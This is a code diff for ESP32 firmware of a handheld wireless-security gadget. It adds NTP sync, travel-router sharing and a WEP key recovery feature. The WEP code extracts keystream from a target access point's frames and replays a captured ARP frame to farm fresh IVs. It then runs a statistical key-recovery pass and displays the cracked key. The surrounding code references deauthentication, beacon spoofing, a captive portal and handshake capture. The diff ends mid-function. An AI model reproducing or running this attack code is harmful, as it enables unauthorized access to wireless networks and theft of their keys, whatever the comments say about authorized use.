@@ -50,6 +50,7 @@
 #include "esp_mac.h"        /* esp_read_mac (factory STA MAC) */
 #include "esp_random.h"     /* esp_fill_random (MAC spoof)    */
 #include "esp_timer.h"      /* periodic channel hop + rate sampler (monitor mode) */
+#include "esp_sntp.h"       /* NTP time sync over WiFi (sets the system clock for WireGuard/TLS) */
 #include "esp_http_server.h"/* M5-P5·4 captive-portal HTTP server                 */
 #include "lwip/sockets.h"   /* M5-P5·4 UDP:53 DNS redirector                      */
 #include "mdns.h"           /* §4.8a Companion — nocsif.local responder           */
@@ -63,6 +64,7 @@
 #include "ui.h"             /* §4.8a mirror — nocsif_ui_mirror_frame (full-res frame the encoder pulls) */
 #include "usb_gadget.h"     /* nocsif_usb_gadget_claim_sd (own /sd for PCAP) */
 #include "power.h"          /* nocsif_power_batt_pct (§4.8a companion /api/ping) */
+#include "wep_recover.h"    /* #4 WEP key recovery — portable Klein/PTW + FMS statistics core */
 
 #include <sys/stat.h>       /* mkdir (PCAP output dir) */
 #include <dirent.h>         /* opendir/readdir — §4.8a P4 companion /sd file browser */
@@ -111,17 +113,18 @@ typedef enum {
     CMD_DISCONNECT, CMD_FORGET, CMD_SCAN_DONE,
     CMD_RECONNECT, CMD_RANDMAC, CMD_RESTMAC, CMD_APPLY_HOST,
     CMD_CONNECT_SAVED, CMD_FORGET_SSID, CMD_SETMAC,
-    CMD_MONITOR_ON, CMD_MONITOR_OFF, CMD_MON_HOP, CMD_MON_CHAN,   /* M5-P2 monitor mode */
-    CMD_PARSE_ON, CMD_PARSE_OFF,                                  /* M5-P3 parser */
-    CMD_PCAP_ON, CMD_PCAP_OFF,                                    /* M5-P3.3 PCAP */
-    CMD_PCAP_STREAM_ON, CMD_PCAP_STREAM_OFF,                      /* M5-P5+ live PCAP over USB-CDC */
-    CMD_HS_ON, CMD_HS_OFF,                                        /* M5-P4.1 EAPOL capture */
-    CMD_MGMTTX_ON, CMD_MGMTTX_OFF, CMD_MGMTTX_TARGET,             /* M5-P5.1 management-frame TX */
-    CMD_BEACON_ON, CMD_BEACON_OFF,                              /* M5-P5.2 beacon TX */
+    CMD_MONITOR_ON, CMD_MONITOR_OFF, CMD_MON_HOP, CMD_MON_CHAN,   /* M5-P2 monitor */
+    CMD_PARSE_ON, CMD_PARSE_OFF,                                  /* M5-P3 parser  */
+    CMD_PCAP_ON, CMD_PCAP_OFF,                                    /* M5-P3·3 PCAP  */
+    CMD_PCAP_STREAM_ON, CMD_PCAP_STREAM_OFF,                      /* M5-P5+ live-PCAP over USB-CDC */
+    CMD_HS_ON, CMD_HS_OFF,                                        /* M5-P4·1 EAPOL capture */
+    CMD_MGMTTX_ON, CMD_MGMTTX_OFF, CMD_MGMTTX_TARGET,             /* M5-P5·1 management-frame TX */
+    CMD_WEP_ON, CMD_WEP_OFF,                                     /* #4 WEP key recovery (target in mac/arg/arg2) */
+    CMD_BEACON_ON, CMD_BEACON_OFF,                              /* M5-P5·2 beacon TX */
     CMD_EXPORT_HC,                                              /* M5 hc22000 export */
     CMD_AP_ON, CMD_AP_OFF,                                      /* M5-P5·3 software AP */
     CMD_PORTAL_ON, CMD_PORTAL_OFF, CMD_PORTAL_RELOAD,           /* M5-P5·4 captive portal */
-    CMD_COMPANION_ON, CMD_COMPANION_OFF,                        /* §4.8a companion web remote (L4) */
+    CMD_COMPANION_ON, CMD_COMPANION_OFF, CMD_COMPANION_SHARE,   /* §4.8a companion web remote (L4) */
     CMD_LEAN_ON, CMD_LEAN_OFF,                                  /* boot-time lean/full buffer profile (BLE coexist) */
     CMD_GEO_STAMP,                                              /* §4.6 P3: learn the connected network's location */
     CMD_GOT_IP,                                                 /* IP_EVENT_STA_GOT_IP, deferred off the sys_evt task */
@@ -222,21 +225,29 @@ static int          s_pl_cnt;
  * footprint is fixed at init time and a runtime swap would just re-fragment
  * the very pool it had just freed (see RAM-BUDGET.md, remake attempts #5/#9). */
 static volatile bool s_lean;
-static volatile bool s_autojoin = true;     /* auto-reconnects the saved network whenever the radio is enabled */
-static uint8_t       s_mac_factory[6];       /* the efuse-programmed station MAC, kept for "restore default" */
-static bool          s_mac_factory_ok;       /* whether s_mac_factory has actually been populated */
+/* Gateway throughput profile (Travel Router): a BOOT-TIME override of the lean set. When main.c sees a
+ * persisted "share" intent it arms this before WiFi comes up, so the one esp_wifi_init uses a buffer set
+ * with 802.11n aggregation ON plus enough TX buffers to feed a block-ack session (LESSONS.md: too-few TX
+ * buffers stall the AP queue on a lost BlockAck). Fixed at init like lean; overrides it in bring_up(). */
+static volatile bool s_gw_profile;
+/* NTP (WiFi) time sync: SNTP sets the SYSTEM clock (UTC) so WireGuard's handshake timestamp + TLS are
+ * valid; s_ntp_gen bumps on each sync for the UI to refresh the PCF RTC (home-local). */
+static volatile uint32_t s_ntp_gen;
+static bool          s_sntp_started;
+static volatile bool s_autojoin = true;     /* auto-reconnect the saved net on enable      */
+static uint8_t       s_mac_factory[6];       /* efuse STA MAC, for "restore default"        */
+static bool          s_mac_factory_ok;       /* s_mac_factory populated                     */
 
-/* ---- monitor / promiscuous capture state (M5-P2) ---- *
- * A trivial O(1) rx callback tallies volatile counters — a single writer,
- * lock-free for UI readers — while an esp_timer hops the channel and samples
- * the 1Hz frame rate off the LVGL task. */
-static volatile bool      s_mon_active;               /* capture is running */
-static volatile bool      s_mon_hop = true;           /* hopping across 1..13 (true) versus locked to one channel (false) */
-static volatile int       s_mon_chan = 1;             /* the current or locked channel (1..13) */
-static bool               s_pending_monitor;          /* whether this was requested before STA_START completed */
-static bool               s_mon_prev_connected;       /* whether there was a live link before capture started */
-static esp_timer_handle_t s_mon_timer;                /* the periodic hop-plus-rate-sampler timer */
-static volatile uint32_t  s_mon_total;                /* all frames captured so far */
+/* ---- monitor / promiscuous capture state (M5-P2) ---------------------------------- *
+ * A trivial O(1) rx callback tallies volatile counters (single writer, lock-free for the UI
+ * readers); an esp_timer hops the channel and samples the 1 Hz frame rate off the LVGL task. */
+static volatile bool      s_mon_active;               /* capture running                    */
+static volatile bool      s_mon_hop = true;           /* hop 1..13 (true) vs lock (false)   */
+static volatile int       s_mon_chan = 1;             /* current / locked channel (1..13)   */
+static bool               s_pending_monitor;          /* asked before STA_START completed   */
+static bool               s_mon_prev_connected;       /* had a live link before capture     */
+static esp_timer_handle_t s_mon_timer;                /* periodic hop + rate sampler        */
+static volatile uint32_t  s_mon_total;                /* all captured frames                */
 static volatile uint32_t  s_mon_by_type[NOCSIF_WIFI_PKT_KINDS];
 static volatile uint32_t  s_mon_ch[14];               /* a per-channel tally, indexed 1..13 */
 static volatile uint32_t  s_mon_rate;                 /* frames per second, over a roughly 1s window */
@@ -272,15 +283,44 @@ static volatile uint32_t  s_tx_rate;                   /* frames per second, ove
 static uint32_t           s_tx_rate_base;
 static int64_t            s_tx_rate_t0;
 static esp_timer_handle_t s_tx_timer;
-static bool               s_tx_logged;                 /* whether the first TX result this session has already been logged */
+static bool               s_tx_logged;                 /* logged the first TX result this session */
 
-/* Beacon TX state (M5-P5.2, active — authorized testing). Advertises a
- * user-managed list of SSIDs — added via keyboard, deleted/renamed/enabled per
- * entry, persisted to NVS — by transmitting beacon frames on an esp_timer
- * while the radio holds a channel. Reuses the P5.1 raw-TX override
- * underneath. The list itself is written by the LVGL task and read by the
- * esp_timer's TX loop, so it's guarded by s_bcn_mux. */
-#define BCN_MAX 32                                      /* the maximum number of SSIDs the beacon list can hold */
+/* ---- WEP key recovery state (#4, active — authorized testing, the operator's OWN network) --- *
+ * The parser hands each WEP data frame from the target to parse_wep(), which derives the IV +
+ * keystream bytes (XOR of the known LLC/SNAP + ARP/IP plaintext against the ciphertext) and pushes
+ * them to a small SPSC ring. A PSRAM-stack worker (wep_worker_task) drains the ring into the
+ * wep_recover context it exclusively owns, and periodically runs the CPU-bound recovery pass. An
+ * optional esp_timer re-injects one captured ARP frame to farm fresh IVs (reuses the raw-TX path).
+ * UI getters read the volatile scalars the worker/parser publish. Neutral capability. */
+typedef struct { uint8_t iv[3]; uint8_t ks[15]; uint8_t ks_len; } wep_samp_t;
+#define WEP_RING_SLOTS 1024                         /* SPSC parse->worker sample ring (power of two) */
+static volatile bool      s_wep_active;
+static uint8_t            s_wep_bssid[6];            /* target AP                                    */
+static char               s_wep_ssid[WIFI_SSID_MAX]; /* target SSID (display only)                   */
+static int                s_wep_cfg_keylen;          /* 0 auto / 5 / 13                              */
+static volatile int       s_wep_state = NOCSIF_WEP_IDLE;
+static volatile uint32_t  s_wep_data_frames;         /* WEP data frames seen from the target          */
+static volatile uint32_t  s_wep_unique;              /* unique IVs (mirror of the ctx)                */
+static volatile uint8_t   s_wep_progress;            /* 0..100                                        */
+static uint8_t            s_wep_key[WEP_KEY_MAX_LEN];
+static volatile int       s_wep_key_bytes;           /* 0 until recovered                             */
+static char               s_wep_key_hex[WEP_KEY_MAX_LEN * 3];    /* "aa:bb:.." (display)              */
+static char               s_wep_key_ascii[WEP_KEY_MAX_LEN + 1];  /* printable form, else ""           */
+static wep_samp_t        *s_wep_ring;                /* PSRAM SPSC ring (parse producer, worker consumer) */
+static volatile uint32_t  s_wep_ring_head, s_wep_ring_tail, s_wep_ring_drop;
+static TaskHandle_t       s_wep_task;
+static volatile bool      s_wep_replay = true;       /* interactive ARP replay accelerator (default on) */
+static uint8_t            s_wep_arp[128];             /* a captured replayable ARP frame (FCS stripped)  */
+static volatile int       s_wep_arp_len;             /* >0 once an ARP frame has been captured           */
+static volatile uint32_t  s_wep_replays;             /* ARP frames re-injected this session             */
+static esp_timer_handle_t s_wep_replay_timer;
+static void               do_wep_off(void);          /* fwd (used by monitor_teardown)                 */
+
+/* Beacon TX state (M5-P5·2, active — authorized testing). Advertises a user-managed list of SSIDs
+ * (add via keyboard, delete/rename/enable per entry; persisted to NVS) by transmitting beacon frames
+ * on an esp_timer while the radio holds a channel. Reuses the P5·1 raw-TX override. The list is
+ * written by the LVGL task and read by the esp_timer TX loop, so it is guarded by s_bcn_mux. */
+#define BCN_MAX 32                                      /* max SSIDs in the beacon list       */
 typedef struct { char ssid[WIFI_SSID_MAX]; bool en; } bcn_entry_t;
 static void               do_beacon_off(void);          /* forward declaration, used by monitor_teardown */
 static bcn_entry_t        s_bcn[BCN_MAX];
@@ -369,34 +409,38 @@ static char               s_portal_log[PORTAL_LOG_MAX][PORTAL_LOG_LINE];
 static int                s_portal_log_head;            /* the ring's write index */
 static int                s_portal_log_cnt;
 
-/* Section 4.8a companion control surface (L4), P1 transport. An open
- * SoftAP — an operator's own decision, with no join gate — plus an mDNS
- * responder for nocsif.local, plus a routed esp_http_server (its own handle,
- * distinct from the captive portal's wildcard server, with which it's
- * mutually exclusive). Anyone on the AP can control the watch; the off-by-
- * default toggle plus the on-watch "linked" indicator are the intended
- * guardrails. Written only by the worker, and read by the LVGL getters only
- * after s_comp_active is set, mirroring the portal getters' single-writer-
- * plus-active-flag-as-barrier pattern. */
-#define COMP_HOST        "nocsif"                        /* resolves to nocsif.local */
-static void               companion_stop(void);          /* forward declaration, used by ap_teardown */
-static httpd_handle_t     s_comp_httpd;                  /* the companion's own HTTP server, on port 80, routed */
-static volatile bool      s_comp_active;                 /* whether the surface is currently up */
-static bool               s_comp_owns_ap;                /* whether the companion itself brought the AP up, so it should tear it down again on off */
-static bool               s_mdns_up;                     /* whether the mDNS responder is running */
-static char               s_comp_ssid[WIFI_SSID_MAX];    /* the open-AP SSID clients join, which is the device name */
-static nocsif_companion_cmd_fn_t s_comp_cmd_fn;          /* P2: the UI-registered command handler */
-static nocsif_companion_json_fn_t s_comp_menu_fn;        /* P2 redesign: the /api/menu provider */
-static nocsif_companion_json_fn_t s_comp_state_fn;       /* P3: the live-state provider, backing /api/ping and /ws */
-static nocsif_companion_touch_fn_t s_comp_touch_fn;      /* interactive control: the WS uplink feeding the remote pointer */
+/* §4.8a Companion control surface (L4) — P1 transport. An OPEN SoftAP (operator call: no join gate) +
+ * mDNS `nocsif.local` + a routed esp_http_server (its OWN handle, distinct from the captive portal's
+ * wildcard server, with which it is mutually exclusive). Anyone on the AP can control the watch — the
+ * off-by-default toggle + the on-watch "linked" indicator are the guardrails. Written only by the
+ * worker; read by the LVGL getters after `s_comp_active` is set (single writer + the active flag as a
+ * barrier, mirroring the portal getters). */
+#define COMP_HOST        "nocsif"                        /* -> nocsif.local                      */
+static void               companion_stop(void);          /* fwd (used by ap_teardown)            */
+static void               companion_napt_apply(bool want); /* fwd (used by ap_teardown)          */
+static httpd_handle_t     s_comp_httpd;                  /* companion HTTP server (:80, routed)  */
+static volatile bool      s_comp_active;                 /* surface is up                        */
+static bool               s_comp_owns_ap;                /* companion brought the AP up (tear on off) */
+/* §4.8a companion internet sharing (travel-router recipe, gateway.c) — when the watch has a STA uplink,
+ * the companion AP runs in APSTA and NAPT-forwards downstream clients, so a phone on the mirror also
+ * reaches the internet whenever the watch does. Desired flag persisted (default ON, NVS "comp_share");
+ * s_comp_napt tracks whether NAPT is live on s_ap_netif right now. Needs CONFIG_LWIP_IP_FORWARD=y +
+ * CONFIG_LWIP_IPV4_NAPT=y (sdkconfig.defaults) — the same build inputs the gateway relies on. */
+#define K_COMP_SHARE      "comp_share"
+static bool               s_comp_share_want = true;      /* desired: share the uplink (from NVS)  */
+static bool               s_comp_napt;                   /* NAPT enabled on s_ap_netif now         */
+static bool               s_mdns_up;                     /* mDNS responder running               */
+static char               s_comp_ssid[WIFI_SSID_MAX];    /* open-AP SSID clients join (device name) */
+static nocsif_companion_cmd_fn_t s_comp_cmd_fn;          /* P2: UI-registered command handler    */
+static nocsif_companion_json_fn_t s_comp_menu_fn;        /* P2 redesign: /api/menu provider      */
+static nocsif_companion_json_fn_t s_comp_state_fn;       /* P3: live-state provider (ping + /ws) */
+static nocsif_companion_touch_fn_t s_comp_touch_fn;      /* interactive: WS uplink → remote pointer */
 
-/* ---- section 4.8a companion, P3 live push (watch to phone over
- * WebSocket) ---- * The companion server keeps a small set of connected /ws
- * client sockets; an esp_timer fires roughly twice a second and queues (via
- * httpd_queue_work) a state frame to each, so the page can live-sync toggles
- * and sliders and raise the phone's native keyboard whenever a watch text
- * field has focus. Sockets are added on the WS handshake and pruned on any
- * send error. All WS I/O happens on the httpd task, via httpd_queue_work. */
+/* ---- §4.8a Companion — P3 live push (watch → phone over WebSocket) ---------------------------- *
+ * The companion server keeps a small set of connected /ws client sockets; an esp_timer fires ~2×/s and
+ * queues (httpd_queue_work) a state frame to each so the page can live-sync toggles/sliders and raise
+ * the phone's native keyboard when a watch text field is focused. Sockets are added on the WS handshake
+ * and pruned on any send error. All WS I/O happens on the httpd task (via httpd_queue_work). */
 #define COMP_WS_MAX 4
 static int                s_ws_fds[COMP_WS_MAX];         /* connected /ws client sockfds (0 = empty) */
 /* Per-client NON-BLOCKING frame send cursor (parallel to s_ws_fds). A mirror frame is 40-60 KB; sent with
@@ -482,7 +526,9 @@ static volatile uint32_t s_ring_drop;            /* frames dropped because the r
 static volatile bool     s_parse_active;         /* frames the rx callback copied in and the parser decoded */
 static TaskHandle_t      s_parse_task;
 
-/* The nearby-AP table; the parser writes it, the LVGL task reads it, guarded by s_ap_mux. */
+static void parse_wep(const cap_slot_t *s, const uint8_t *d);   /* #4 WEP data-frame consumer */
+
+/* Nearby-AP table (parser writes, LVGL reads; guarded by s_ap_mux). */
 typedef struct {
     bool     used;
     uint8_t  bssid[6];
@@ -1216,6 +1262,27 @@ static void on_wifi_evt(void *arg, esp_event_base_t base, int32_t id, void *data
  * all on the worker's own 4 KB stack. Runs a few ms after the event. A disconnect that raced in
  * between already cleared the netinfo on the event task, so bail rather than republish a dead lease —
  * the reconnect's got-IP will post again. */
+/* SNTP sync callback (runs on the SNTP task): esp_sntp has already applied the system clock (UTC) via
+ * settimeofday — bump the generation so the UI refreshes the PCF RTC. */
+static void on_ntp_synced(struct timeval *tv)
+{
+    s_ntp_gen++;
+    ESP_LOGI(TAG, "NTP: system clock set (epoch %lld)", (long long)tv->tv_sec);
+}
+
+/* Start (or re-poll) NTP once the STA has an IP. Sets the system clock in the background; WireGuard's
+ * handshake timestamp (gettimeofday) + TLS depend on it, and the UI mirrors it to the RTC. */
+static void start_time_sync(void)
+{
+    if (s_sntp_started) { esp_sntp_restart(); return; }   /* fresh link -> re-poll now */
+    esp_sntp_setoperatingmode(SNTP_OPMODE_POLL);
+    esp_sntp_setservername(0, "pool.ntp.org");
+    sntp_set_time_sync_notification_cb(on_ntp_synced);
+    esp_sntp_init();
+    s_sntp_started = true;
+    ESP_LOGI(TAG, "NTP: sync started (pool.ntp.org)");
+}
+
 static void do_got_ip(const esp_netif_ip_info_t *info)
 {
     if (!s_connected) {
@@ -1232,6 +1299,7 @@ static void do_got_ip(const esp_netif_ip_info_t *info)
     ESP_LOGI(TAG, "got IP %s on \"%s\"", ip, s_ssid);
     persist_creds();                        /* only credentials that are known-good actually reach NVS */
     upsert_saved(s_ssid, s_pass);           /* remember it for the saved-networks list */
+    start_time_sync();                      /* NTP: set the system clock (WireGuard/TLS) + feed the RTC */
     refresh_strings();
     s_join_state = NOCSIF_WIFI_JOIN_CONNECTED;   /* last: "Done" only once the address + detail line are readable */
 }
@@ -1314,8 +1382,28 @@ static bool bring_up(void)
      * sync, but monitor/capture/wardrive work should run on the full
      * profile. */
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    if (s_lean) {
-        cfg.static_rx_buf_num  = 2;    /* MAC RX DMA buffers, 1.6 KB each, must be internal memory */
+    if (s_gw_profile) {
+        /* TRAVEL ROUTER THROUGHPUT PROFILE (overrides lean at boot when share is persisted). The lean set
+         * disables 802.11n aggregation entirely (rx_ba_win=0, ampdu_tx=0) — the single biggest reason the
+         * shared APSTA path is slow, since every forwarded byte crosses the one radio twice with no
+         * aggregation. Turn aggregation back ON, with enough static/cache TX buffers to actually feed a
+         * block-ack session (2 static TX was the stall trap in LESSONS.md). Buffer COUNT raises int-DMA
+         * total-free use but does NOT shrink the largest contiguous hole (RAM-BUDGET.md measured: lean &
+         * full both leave largest=15,872), and BLE's ~31.7 KB block is claimed before this init, so this
+         * does not touch the coexistence gate. Dynamic RX + LWIP route to PSRAM (SPIRAM_TRY_ALLOCATE_WIFI_
+         * LWIP), so the internal-DMA cost is the static RX/TX (1.6 KB ea) + cache TX; trimmed vs the full
+         * IDF default (static_tx 6, cache_tx 16) to keep steady-state headroom for the LoRa-alert/mic
+         * reserves. rx_ba_win 6 <= 2*static_rx (8) and <= dynamic_rx (16). */
+        cfg.static_rx_buf_num  = 4;
+        cfg.dynamic_rx_buf_num = 16;   /* PSRAM */
+        cfg.static_tx_buf_num  = 4;
+        cfg.cache_tx_buf_num   = 12;
+        cfg.rx_mgmt_buf_num    = 4;
+        cfg.ampdu_rx_enable    = 1;
+        cfg.rx_ba_win          = 6;
+        cfg.ampdu_tx_enable    = 1;
+    } else if (s_lean) {
+        cfg.static_rx_buf_num  = 2;    /* MAC RX DMA buffers, 1.6 KB each (must be internal)      */
         cfg.dynamic_rx_buf_num = 4;
         cfg.static_tx_buf_num  = 2;    /* 1.6 KB each */
         cfg.cache_tx_buf_num   = 4;
@@ -1331,7 +1419,7 @@ static bool bring_up(void)
     e = esp_wifi_init(&cfg);
     if (e != ESP_OK) { ESP_LOGE(TAG, "esp_wifi_init: %s", esp_err_to_name(e)); goto fail; }
     ESP_LOGI(TAG, "esp_wifi_init (%s profile); int-dma free=%u largest=%u",
-             s_lean ? "LEAN" : "full",
+             s_gw_profile ? "GATEWAY" : s_lean ? "LEAN" : "full",
              (unsigned)nocsif_int_dma_free(),
              (unsigned)nocsif_int_dma_largest());
 
@@ -1520,6 +1608,7 @@ static void do_connect(const char *ssid, const char *pass)
     if (ssid == NULL || ssid[0] == '\0') {
         return;
     }
+    monitor_teardown();   /* single radio: a join ends promiscuous capture / WEP recovery */
     snprintf(s_ssid, sizeof s_ssid, "%s", ssid);
     snprintf(s_pass, sizeof s_pass, "%s", pass ? pass : "");
     s_retry = 0;
@@ -1779,12 +1868,13 @@ static void on_promiscuous(void *buf, wifi_promiscuous_pkt_type_t type)
         } else {
             cap_slot_t *slot = &s_ring[tail & (CAP_SLOTS - 1)];
             uint16_t len  = p->rx_ctrl.sig_len;
-            /* Data frames only need their MAC header for the station map (a short
-             * snaplen), with one exception: an EAPOL frame is copied in full so the
-             * parser can read the key exchange and any PMKID. */
+            /* Data frames need only the MAC header for the station map (short snaplen), EXCEPT an
+             * EAPOL frame (copied in full for the key exchange + PMKID) and — while WEP recovery is
+             * active — a PROTECTED data frame, whose IV + encrypted body the recovery parser needs. */
             uint16_t snap = CAP_SNAP;
             if (type == WIFI_PKT_DATA) {
-                snap = eapol_offset(p->payload, len) ? CAP_SNAP : CAP_SNAP_DATA;
+                bool wep_prot = (s_wep_active && len >= 2 && (p->payload[1] & 0x40));
+                snap = (wep_prot || eapol_offset(p->payload, len)) ? CAP_SNAP : CAP_SNAP_DATA;
             }
             uint16_t cap  = len > snap ? snap : len;
             slot->ts_us    = esp_timer_get_time();
@@ -1924,10 +2014,11 @@ static void enter_promiscuous(void)
 static void monitor_teardown(void)
 {
     s_pending_monitor = false;
-    s_parse_active = false;                           /* no capture running: stop parsing too, though the ring/task itself is kept */
-    do_mgmt_tx_off();                                 /* no capture running: stop any management-frame TX too */
-    do_beacon_off();                                  /* no capture running: stop any beacon TX too */
-    pcap_stop_and_free();                             /* no capture running: stop PCAP and free the writer task */
+    s_parse_active = false;                           /* no capture -> stop parsing (ring/task kept) */
+    do_mgmt_tx_off();                                 /* no capture -> stop any management-frame TX  */
+    do_wep_off();                                     /* no capture -> stop WEP recovery (worker+replay) */
+    do_beacon_off();                                  /* no capture -> stop any beacon TX            */
+    pcap_stop_and_free();                             /* no capture -> stop PCAP + free the writer task */
     if (!s_mon_active) {
         return;
     }
@@ -2396,6 +2487,7 @@ static void parse_frame(const cap_slot_t *s)
         parse_data_frame(s, d);
         int eo = eapol_offset(d, s->cap_len);       /* the key exchange rides inside EAPOL data frames */
         if (eo) parse_eapol(s, d, eo);
+        if (s_wep_active && (d[1] & 0x40)) parse_wep(s, d);  /* #4: WEP data frames -> IV+keystream */
         return;
     }
     if (ftype != 0) {                               /* control frames carry no identity information here */
@@ -3322,11 +3414,218 @@ static void do_mgmt_tx_off(void)
     ESP_LOGI(TAG, "mgmt-tx OFF (%u frames)", (unsigned)s_tx_count);
 }
 
-/* ---- beacon TX (M5-P5.2, active — authorized testing) ---- *
- * Advertises N decoy networks by transmitting beacon frames, each with a
- * distinct locally-administered BSSID and a generated "NocSif-NN" SSID —
- * deliberately using our own name, so it never impersonates a real network.
- * Reuses the P5.1 raw-TX override. */
+/* ---- WEP key recovery (#4, active — authorized testing, the operator's OWN network) --- *
+ * parse_wep() derives IV + keystream from each of the target's WEP data frames (XOR of the known
+ * LLC/SNAP + ARP/IP plaintext against the ciphertext) and pushes a sample to the SPSC ring; the
+ * PSRAM-stack wep_worker_task drains it into the wep_recover core and runs the recovery pass. An
+ * esp_timer re-injects one captured ARP frame to farm fresh IVs (reuses the raw-TX override). The
+ * RC4/keystream math lives in the portable wep_recover.{c,h}; this is only the radio glue. */
+
+/* Cooperative-yield hook for the recovery worker: the try() pass is CPU-bound, so it periodically
+ * lets the idle task run (feeds the task WDT) and lower-priority work proceed. */
+static void wep_yield_cb(void *arg) { (void)arg; vTaskDelay(1); }
+
+/* Decode one captured WEP data frame from the target and push (IV, keystream) to the ring. Runs on
+ * the parser task (off the rx hot path). Also stashes the first ARP frame for the replay farm. */
+static void parse_wep(const cap_slot_t *s, const uint8_t *d)
+{
+    /* Known leading plaintext: LLC/SNAP (always) + the ARP fixed header (for an ARP frame). Indices
+     * 0..5 are the SNAP bytes present in every LLC/SNAP frame; 6..14 are the ARP EtherType+header. */
+    static const uint8_t KP_ARP[15] = { 0xAA,0xAA,0x03,0x00,0x00,0x00, 0x08,0x06,
+                                        0x00,0x01,0x08,0x00,0x06,0x04,0x00 };
+    int len = s->cap_len;
+    if (len < 28) return;                                 /* need at least a header + IV + a little */
+    bool tods   = (d[1] & 0x01) != 0;
+    bool fromds = (d[1] & 0x02) != 0;
+    const uint8_t *bssid = fromds ? (d + 10) : (tods ? (d + 4) : (d + 16));  /* addr2 / addr1 / addr3 */
+    if (memcmp(bssid, s_wep_bssid, 6) != 0) return;       /* only the selected target AP */
+
+    uint8_t fsub = (d[0] >> 4) & 0xF;
+    int hdr = 24;
+    if (tods && fromds) hdr += 6;                         /* 4-address (WDS) header */
+    if (fsub & 0x08)    hdr += 2;                         /* QoS control            */
+    if (hdr + 4 + 6 > len) return;                        /* need IV(4) + >=6 ciphertext bytes */
+
+    const uint8_t *iv = d + hdr;                          /* 3-byte IV + 1-byte KeyID */
+    const uint8_t *ct = d + hdr + 4;                      /* WEP-encrypted body (LLC/SNAP...) */
+    int ctlen = len - hdr - 4;
+    s_wep_data_frames++;
+
+    /* ARP frames give the longest known plaintext (needed for the upper key bytes). Identify one by
+     * its length: encrypted payload = LLC/SNAP(8) + ARP(28) + ICV(4) = 40, then the 802.11 FCS(4).
+     * The captured orig_len may or may not include the FCS, so accept both 40 and 44. */
+    int paylen = (int)s->orig_len - hdr - 4;              /* encrypted body (+ICV) [+FCS] */
+    bool is_arp = (paylen == 40 || paylen == 44);
+
+    wep_samp_t samp;
+    samp.iv[0] = iv[0]; samp.iv[1] = iv[1]; samp.iv[2] = iv[2];
+    int n = 0, want = (is_arp && ctlen >= 15) ? 15 : (ctlen >= 6 ? 6 : ctlen);
+    for (n = 0; n < want; n++) samp.ks[n] = (uint8_t)(ct[n] ^ KP_ARP[n]);
+    samp.ks_len = (uint8_t)n;
+
+    if (s_wep_ring && n >= 1) {                            /* push to the SPSC ring (worker drains) */
+        uint32_t tail = s_wep_ring_tail;                                       /* sole producer */
+        uint32_t head = __atomic_load_n(&s_wep_ring_head, __ATOMIC_ACQUIRE);
+        if ((tail - head) >= WEP_RING_SLOTS) {
+            s_wep_ring_drop++;
+        } else {
+            s_wep_ring[tail & (WEP_RING_SLOTS - 1)] = samp;
+            __atomic_store_n(&s_wep_ring_tail, tail + 1, __ATOMIC_RELEASE);
+        }
+    }
+
+    /* Stash the first ARP frame for the replay farm. The replayable frame is exactly hdr + IV(4) +
+     * encrypted(40) bytes (no FCS — the driver appends its own on TX). */
+    if (is_arp && s_wep_arp_len == 0 && s_wep_replay) {
+        int flen = hdr + 4 + 40;
+        if (flen <= (int)sizeof s_wep_arp && flen <= len) {
+            memcpy(s_wep_arp, d, (size_t)flen);
+            s_wep_arp_len = flen;                          /* publish last: >0 means valid */
+        }
+    }
+}
+
+/* Re-inject the captured ARP frame so the AP emits a fresh-IV response (esp_timer task). */
+static void wep_replay_fire(void *arg)
+{
+    (void)arg;
+    if (!s_wep_active || !s_wep_replay || !s_mon_active || s_wep_arp_len <= 0) return;
+    if (esp_wifi_80211_tx(WIFI_IF_STA, s_wep_arp, s_wep_arp_len, false) == ESP_OK) {
+        s_wep_replays++;
+    }
+}
+
+/* Recovery worker: owns the wep_recover context, drains the sample ring, runs the CPU-bound pass at
+ * increasing IV thresholds, and publishes progress + the recovered key. PSRAM stack. */
+static void wep_worker_task(void *arg)
+{
+    (void)arg;
+    wep_recover_cfg_t cfg;
+    memset(&cfg, 0, sizeof cfg);
+    cfg.key_len     = (uint8_t)s_wep_cfg_keylen;                          /* 0 auto / 5 / 13 */
+    cfg.max_samples = (s_wep_cfg_keylen == WEP_KEY40_LEN) ? 55000u : 120000u;
+    wep_recover_ctx_t ctx;
+    if (!wep_recover_ctx_init_cfg(&ctx, &cfg)) {
+        ESP_LOGE(TAG, "wep: ctx init failed (PSRAM ~%u KB)",
+                 (unsigned)((cfg.max_samples * 19u + cfg.max_samples * 8u) / 1024u));
+        s_wep_state = NOCSIF_WEP_FAILED;
+        s_wep_task = NULL;
+        vTaskDeleteWithCaps(NULL);
+        return;
+    }
+    wep_recover_set_yield(&ctx, wep_yield_cb, NULL);
+
+    uint32_t next_try = (s_wep_cfg_keylen == WEP_KEY104_LEN) ? 100000u : 40000u;
+    while (s_wep_active) {
+        uint32_t head = s_wep_ring_head;                                     /* sole consumer */
+        uint32_t tail = __atomic_load_n(&s_wep_ring_tail, __ATOMIC_ACQUIRE);
+        while (head != tail) {
+            const wep_samp_t *smp = &s_wep_ring[head & (WEP_RING_SLOTS - 1)];
+            wep_recover_add_sample(&ctx, smp->iv, smp->ks, smp->ks_len);
+            head++;
+        }
+        __atomic_store_n(&s_wep_ring_head, head, __ATOMIC_RELEASE);
+
+        uint32_t u = wep_recover_unique_ivs(&ctx);
+        s_wep_unique   = u;
+        s_wep_progress = wep_recover_progress(&ctx);
+
+        if (u >= next_try) {
+            uint8_t key[WEP_KEY_MAX_LEN], klen = 0;
+            uint32_t need = 0;
+            wep_recover_status_t st = wep_recover_try(&ctx, key, &klen, &need);
+            if (st == WEP_RECOVER_RECOVERED && klen > 0) {
+                static const char hexd[] = "0123456789abcdef";
+                int j = 0; bool printable = true;
+                memcpy(s_wep_key, key, klen);
+                for (int i = 0; i < klen; i++) {
+                    if (i) s_wep_key_hex[j++] = ':';
+                    s_wep_key_hex[j++] = hexd[(key[i] >> 4) & 0xF];
+                    s_wep_key_hex[j++] = hexd[key[i] & 0xF];
+                    if (key[i] < 0x20 || key[i] >= 0x7F) printable = false;
+                }
+                s_wep_key_hex[j] = '\0';
+                if (printable) { memcpy(s_wep_key_ascii, key, klen); s_wep_key_ascii[klen] = '\0'; }
+                else           { s_wep_key_ascii[0] = '\0'; }
+                s_wep_key_bytes = klen;
+                if (s_wep_replay_timer) esp_timer_stop(s_wep_replay_timer);   /* no more replay farming */
+                s_wep_active = false;                        /* stop feeding parse_wep; capture stays for the UI */
